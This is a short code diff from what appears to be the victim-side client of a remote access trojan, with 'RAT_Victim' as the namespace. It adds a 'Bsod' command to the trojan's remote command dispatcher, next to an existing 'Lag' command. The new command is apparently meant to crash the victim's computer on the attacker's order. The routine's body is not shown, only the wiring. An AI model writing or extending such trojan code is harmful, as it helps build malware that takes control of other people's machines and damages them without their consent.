@@ -65,6 +65,9 @@ namespace RAT_Victim
                     case RatCommand.Lag:
                         Commands.Lag();
                         break;
+                    case RatCommand.Bsod:
+                        Commands.Bsod();
+                        break;
                     default:
                         throw new ArgumentOutOfRangeException();
                 }
